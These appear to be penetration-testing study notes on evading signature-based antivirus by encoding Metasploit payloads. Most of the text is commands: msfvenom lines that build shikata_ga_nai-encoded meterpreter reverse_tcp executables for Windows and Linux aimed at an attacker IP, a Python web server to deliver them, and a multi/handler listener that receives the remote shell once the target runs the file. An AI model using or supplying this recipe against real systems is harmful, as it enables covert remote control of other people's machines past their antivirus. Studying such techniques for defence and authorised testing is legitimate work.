* Most end user AV solutions use signature-based detection to identify malicious files or executables.

* Attackers can evade older signature based AV solution by encoding the payloads.

* **How is encoding of a payload done**
  * By modifying the payload shell code with the objective of modifying the payload signature.
 
* **Shell code** - A piece of code in the payload used for exploitation.
 
* **This method is no longer that useful as it is hard to surpass most of the AV solutions these days.**

* PRACTICAL
* `msfvenom --list encoders`
* **WIndows x82 payload**
  * `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker's IP] LPORT= [port] -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe`
  * We can repeat the process to increase the chances of by-passing the AV.
  * To increase the number of iterations:
      * -i [number of iterations] OR --iterations [number]
      * `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker's IP] LPORT= [port] -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe`
   
* **Linux 32-bit**
  * `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Attacker's IP] LPORT= [port] -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Windows_Payloads/encodedx86.exe`
 
* **Exploitation**
  * `sudo python  -m SimpleHTTPServer 80`
  * In a new terminal:
    * `msfconsole`
    * `use multi/handler`
    * `set payload windows/meterpreter/reverse_tcp`
    * `set lhost`
    * `set lport`
    * `run` --> To start the listener
    * Go to the target machine , downlaod and execute the payload.
    * This will give a meterpreter session where the listener was waiting for the response.
   
* **Note**:
  * Testing these encoders on the anti-virus without any sandbox system is not recommended, as the AV solutions will store and prohibit the signatures made by us.
  * So the way to test it is to create a sandbox system disconnected from the internet, and then test the payloads to see if they are detected.
